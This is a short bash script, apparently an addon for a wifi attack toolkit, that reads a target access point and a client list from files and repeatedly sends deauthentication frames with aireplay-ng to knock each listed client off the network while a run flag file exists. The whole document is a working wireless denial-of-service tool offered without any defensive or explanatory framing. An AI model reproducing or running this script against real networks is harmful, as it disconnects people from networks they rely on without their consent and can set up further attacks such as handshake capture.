#!/bin/bash
export ADDON=`cat addons/base/addon.set`
DEAUTH_CNT=5
pwd=$(pwd)
AP=`cat $ADDON/data/target.ap`
echo "Deauthing @$AP [$pwd]"
while [ -f $ADDON/data/run.kick ];
do
	log "Kicking Running Cycle finished"
	while read -r line;
	do
		if [ ${#line} -ge 10 ]; then
			aireplay-ng -0 $DEAUTH_CNT -a $AP -h $line --ignore-negative-one mon0
		fi
	done < "$ADDON/data/byebyeclients.lst"
	sleep 1
done
